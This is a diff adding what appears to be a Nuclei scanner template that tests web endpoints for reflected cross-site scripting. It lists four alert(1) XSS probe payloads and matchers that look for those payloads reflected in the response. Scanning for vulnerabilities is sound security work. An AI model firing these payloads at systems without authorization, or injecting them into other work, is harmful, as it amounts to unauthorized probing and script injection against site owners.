@@ -1,0 +1,32 @@
+id: XSS
+
+info:
+  name: XSS
+  author: katsuro
+  severity: unknown
+  tags: xss
+
+http:
+  - raw:
+      - |
+        {{REQUEST}}
+
+    payloads:
+      payloadStr:
+        - "<img src=1 onerror=alert(1)>xss</img>"
+        - "<script>alert(1)</script>"
+        - '"><svg onload=alert(1)>'
+        - '"></select><img src=1 onerror=alert(1)>'
+
+    stop-at-first-match: true
+
+    matchers:
+      - type: word
+        part: body
+        condition: or
+        words:
+          - "{{payloadStr}}"
+          - "{{url_encode(payloadStr)}}"
+          - "{{html_escape(payloadStr)}}"
+          - "{{url_decode(payloadStr)}}"
+          - "{{html_unescape(payloadStr)}}"
